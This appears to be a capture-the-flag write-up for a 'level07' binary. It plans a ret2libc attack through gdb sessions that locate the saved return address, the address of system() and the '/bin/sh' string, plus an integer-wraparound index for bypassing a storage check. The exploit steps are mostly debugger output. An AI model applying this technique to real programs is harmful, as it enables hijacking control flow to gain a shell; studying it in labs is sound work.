We want to perform a ret2libc attack.

We have a way to store data at an index. We can use this function to change the address stored in the eip.  
```C
(gdb) disas main
Dump of assembler code for function main:
   0x08048723 <+0>:	push   %ebp
   0x08048724 <+1>:	mov    %esp,%ebp
   0x08048726 <+3>:	push   %edi
   0x08048727 <+4>:	push   %esi
   0x08048728 <+5>:	push   %ebx
   0x08048729 <+6>:	and    $0xfffffff0,%esp
   0x0804872c <+9>:	sub    $0x1d0,%esp
   0x08048732 <+15>:	mov    0xc(%ebp),%eax
   0x08048735 <+18>:	mov    %eax,0x1c(%esp)
   0x08048739 <+22>:	mov    0x10(%ebp),%eax
   0x0804873c <+25>:	mov    %eax,0x18(%esp)
   0x08048740 <+29>:	mov    %gs:0x14,%eax
   0x08048746 <+35>:	mov    %eax,0x1cc(%esp)
   0x0804874d <+42>:	xor    %eax,%eax
   0x080488e1 <+446>:	jne    0x80488f8 <main+469>
   0x080488e3 <+448>:	lea    0x24(%esp),%eax
   0x080488e7 <+452>:	mov    %eax,(%esp)
   0x080488ea <+455>:	call   0x8048630 <store_number> // WE SET A BREAKPOINT HERE : b *0x080488ea
   0x080488ef <+460>:	mov    %eax,0x1b4(%esp)
   0x080488f6 <+467>:	jmp    0x8048965 <main+578>
   0x080489ea <+711>:	lea    -0xc(%ebp),%esp
   0x080489ed <+714>:	pop    %ebx
   0x080489ee <+715>:	pop    %esi
   0x080489ef <+716>:	pop    %edi
   0x080489f0 <+717>:	pop    %ebp
   0x080489f1 <+718>:	ret    
End of assembler dump.
(gdb) b *0x080488ea
Breakpoint 1 at 0x80488ea
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x080488ea in main ()
(gdb) x/wx $esp
0xffffd530:	0xffffd554
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x80488ea in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
(gdb) 
```

```C
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c
(gdb) 
```

Breakpoint 1, 0x08048636 in store_number ()
(gdb) info frame
Stack level 0, frame at 0xffffd530:
 eip = 0x8048636 in store_number; saved eip 0x80488ef
 called by frame at 0xffffd720
 Arglist at 0xffffd528, args: 
 Locals at 0xffffd528, Previous frame's sp is 0xffffd530
 Saved registers:
  ebp at 0xffffd528, eip at 0xffffd52c
(gdb)  x/wx $esp
0xffffd500:	0x00000000
(gdb) 


Addr of system():
```C
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Addr of "/bin/sh":
```C
(gdb) info proc mappings
process 1810
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
	 0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
	 0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found. 
```

114 % 2^30 --> 1073741938